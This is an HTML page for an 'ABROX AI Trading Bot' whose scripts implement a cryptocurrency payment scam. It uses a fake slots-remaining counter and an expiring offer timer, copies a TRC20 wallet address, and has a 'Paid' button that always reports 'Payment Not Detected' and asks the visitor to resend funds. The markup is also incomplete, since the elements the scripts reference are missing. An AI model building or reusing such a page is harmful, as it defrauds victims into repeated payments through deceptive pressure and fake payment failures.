<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>ABROX AI Trading Bot</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<script src="https://cdn.tailwindcss.com"></script>
<style>
body {
  margin: 0;
  background: #000;
  font-family: -apple-system,BlinkMacSystemFont,"SF Pro Text","SF Pro Display",system-ui,Helvetica,Arial,sans-serif;
}
.space-bg {
  position: relative;
  background: radial-gradient(circle at top,#0d4f8b 0%,#062a4d 35%,#020b16 75%);
  overflow: hidden;
}
.star {
  position:absolute;
  background:#fff;
  border-radius:50%;
}
.icon-box {
  width:14vw; height:14vw; max-width:64px; max-height:64px; border-radius:14px;
  display:flex; align-items:center; justify-content:center;
  font-size:6vw; font-weight:700;
  box-shadow: inset 0 0 0 1px rgba(255,255,255,0.06), 0 4px 10px rgba(0,0,0,0.4);
}
.icon-box.usd { background: linear-gradient(180deg,#134b7a,#0f365e); color:#7dd3fc; }
.icon-box.btc { background: linear-gradient(180deg,#0b233e,#091d33); color:#fff; }
.dropdown-btn {
  background: linear-gradient(180deg,#1bb6c9,#0ea5b7);
  color:#fff; font-weight:600; padding:3vw 4vw; border-radius:12px;
  display:flex; justify-content:space-between; align-items:center;
  box-shadow: inset 0 0 0 1px rgba(255,255,255,0.12);
  cursor:pointer;
  font-size:4vw;
}
.dropdown-list {
  position:absolute; top:calc(100% + 0.5vw); left:0; width:100%; background:#fff;
  border-radius:12px; overflow-y:auto; max-height:40vh;
  z-index:50; box-shadow:0 12px 35px rgba(0,0,0,0.45);
  font-size:4vw;
  -webkit-overflow-scrolling: touch;
  scroll-behavior: smooth;
  overscroll-behavior: contain;
  scroll-snap-type: y mandatory;
}
.dropdown-list div {
  padding:3vw 4vw; color:#000; font-weight:500; cursor:pointer;
  scroll-snap-align: center;
  transition: transform 0.2s, font-size 0.2s, color 0.2s;
}
.dropdown-list div.active {
  transform: scale(1.1);
  font-size:4.5vw;
  color:#1bb6c9;
}
#startBtn {
  margin-top:4vw; width:100%; padding:4vw; border-radius:999px;
  font-weight:700; background: linear-gradient(90deg,#ec4899,#8b5cf6); color:#fff;
  cursor:pointer; font-size:4vw;
}
.dotAnim { display:inline-block; width:12vw; text-align:left; }
@keyframes pulseScale { 0%,100% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.1); opacity: 0.8; } }
.animate-pulse { animation: pulseScale 1s infinite; }
@keyframes glowPulse {
  0%,100% { filter: drop-shadow(0 0 5px #ff5fd2) drop-shadow(0 0 10px #8b5cf6); }
  50% { filter: drop-shadow(0 0 15px #ff5fd2) drop-shadow(0 0 25px #8b5cf6); }
}
@keyframes logo3D {
  0% { transform: rotateY(0deg) rotateX(0deg) scale(1); }
  50% { transform: rotateY(15deg) rotateX(10deg) scale(1.05); }
  100% { transform: rotateY(0deg) rotateX(0deg) scale(1); }
}
.svg-glow { animation: glowPulse 2s infinite ease-in-out; }
.svg-3d { animation: logo3D 6s infinite ease-in-out; transform-origin: center; }
@media(max-width: 420px){
  .w-[390px] { width: 95vw; }
  .h-[844px] { height: 95vh; }
  svg text { font-size: 14vw !important; } 
  #startBtn { padding: 3vw; font-size: 4vw; }
  .dropdown-btn { padding:2.5vw 3vw; font-size:3.5vw; }
}
/* Processing spinner */
@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
@keyframes glowPulseSpin {
  0%,100% { filter: drop-shadow(0 0 10px #ff5fd2) drop-shadow(0 0 15px #8b5cf6); }
  50% { filter: drop-shadow(0 0 25px #ff5fd2) drop-shadow(0 0 35px #8b5cf6); }
}
.processing-circle {
  width: 96px;
  height: 96px;
  position: relative;
}
.processing-circle div {
  width: 100%;
  height: 100%;
  border-radius: 50%;
  border: 6px solid transparent;
  border-top-color: #ff5fd2;
  border-bottom-color: #3b82f6;
  animation: spin 1s linear infinite, glowPulseSpin 2s infinite ease-in-out;
}
</style>
</head>
<body class="flex justify-center items-center min-h-screen">
<div class="w-[390px] h-[844px] rounded-3xl overflow-hidden relative space-bg text-white">

  <!-- STARS -->
  <div id="stars"></div>

  <!-- HEADER -->
  <div class="flex justify-between items-center px-5" style="height: clamp(80px,15vw,140px);">
    <!-- 3D Glowing ABROX Logo -->
    <svg id="abroxLogo" class="svg-glow svg-3d" viewBox="0 0 600 200" xmlns="http://www.w3.org/2000/svg"
         style="width: clamp(150px,50%,400px); height: 100%;" preserveAspectRatio="xMidYMid meet">
      <defs>
        <linearGradient id="abroxGradient" x1="0%" y1="0%" x2="100%" y2="100%">
          <stop offset="0%" stop-color="#ff5fd2"/>
          <stop offset="50%" stop-color="#8b5cf6"/>
          <stop offset="100%" stop-color="#3b82f6"/>
        </linearGradient>
      </defs>
      <g transform="translate(300,100) scale(1.15,1.15)">
        <polygon points="-70,-90 70,-45 50,-30 0,-70 -50,-30 -70,-45" fill="url(#abroxGradient)" />
        <polygon points="-70,90 70,45 50,30 0,70 -50,30 -70,45" fill="url(#abroxGradient)" />
        <text x="0" y="12" text-anchor="middle" font-size="clamp(20px,7vw,70px)" font-weight="900"
              font-family="-apple-system,BlinkMacSystemFont,SF Pro Display,system-ui"
              fill="url(#abroxGradient)"
              style="filter: drop-shadow(0 0 10px #ff5fd2)
                            drop-shadow(0 0 20px #8b5cf6)
                            drop-shadow(0 0 30px #3b82f6);">
          ABROX
        </text>
      </g>
    </svg>
    <div class="bg-cyan-600 px-3 py-1 rounded-lg text-sm font-medium">üá∫üá∏ en</div>
  </div>

  <!-- Rest of your content, modals, and scripts remain unchanged -->
  <!-- ... -->
</div>

<script>
// Stars
const starsContainer=document.getElementById("stars");
for(let i=0;i<40;i++){
  const s=document.createElement("div");
  s.className="star";
  s.style.top=Math.random()*100+"%";
  s.style.left=Math.random()*100+"%";
  s.style.width=s.style.height=(Math.random()*2+1)+"px";
  s.style.opacity=Math.random()*0.7+0.3;
  starsContainer.appendChild(s);
}

// Dropdowns
let currency=null, timeframe=null;
function toggleDropdown(id){ document.getElementById(id).classList.toggle("hidden"); }
function selectCurrency(val){ currency=val; document.querySelectorAll('.dropdown-btn')[0].innerHTML = val+' <span class="text-sm">‚ñæ</span>'; document.getElementById('currencyList').classList.add("hidden"); }
function selectTime(val){ timeframe=val; document.querySelectorAll('.dropdown-btn')[1].innerHTML = val+' <span class="text-sm">‚ñæ</span>'; document.getElementById('timeList').classList.add("hidden"); }
function startSignals(){ if(!currency||!timeframe){ document.getElementById("warn").classList.remove("hidden"); return; } showPaymentModal(); }
document.addEventListener('click', e=>{
  if(!e.target.closest('.dropdown-btn')){
    document.getElementById('currencyList').classList.add('hidden');
    document.getElementById('timeList').classList.add('hidden');
  }
});

// Premium modal
let remainingSlots=7, countdown=300;
const slotCounter=document.getElementById('slotCounter');
const countdownTimer=document.getElementById('countdownTimer');
function showPaymentModal(){ const modal=document.getElementById("paymentModal"); modal.classList.remove("hidden"); startCountdown(); }
function startCountdown(){ clearInterval(window.countdownInterval); countdown=300;
window.countdownInterval=setInterval(()=>{
  const mins=Math.floor(countdown/60), secs=countdown%60;
  countdownTimer.textContent=`${mins}:${secs<10?'0':''}${secs}`;
  countdown--;
  if(countdown<0){ clearInterval(window.countdownInterval); countdownTimer.textContent="‚è≥ Offer Expired!"; }
},1000);}
function copyWallet(){ navigator.clipboard.writeText("TY23RUXeNaibpnTnvxxu18qiqtMpDws6yB").then(()=>alert("Wallet address copied")).catch(()=>alert("Copy failed")); }

// Processing Dots Animation
const dotSpan = document.getElementById('dotAnim');
let dotCount = 0;
let dotInterval;
function startDotAnimation() { clearInterval(dotInterval); dotCount = 0; dotInterval = setInterval(() => { dotCount = (dotCount + 1) % 4; dotSpan.textContent = '.'.repeat(dotCount); }, 500); }
function stopDotAnimation() { clearInterval(dotInterval); dotSpan.textContent = ''; }

// Paid button
document.getElementById("paidBtn").onclick = () => {
  document.getElementById("paymentModal").classList.add("hidden");
  const proc = document.getElementById("processingModal");
  proc.classList.remove("hidden");
  startDotAnimation();
  const statusDiv = document.getElementById('paymentStatus');
  const actionsDiv = document.getElementById('postPaymentActions');
  statusDiv.innerHTML = '';
  actionsDiv.classList.add('hidden');

  setTimeout(() => {
    stopDotAnimation();
    statusDiv.innerHTML = `
      <p class="text-red-400 font-bold text-lg mb-2">‚ùå Payment Not Detected</p>
      <p class="text-white text-sm mb-2">Please resend via TRC20 or contact support:</p>
    `;
    actionsDiv.classList.remove('hidden');
  }, 4000);
};

// Retry Payment Button
document.getElementById("retryBtn").onclick = () => {
  document.getElementById("processingModal").classList.add("hidden");
  document.getElementById("paymentModal").classList.remove("hidden");
  startCountdown();
};
</script>
</body>
</html>
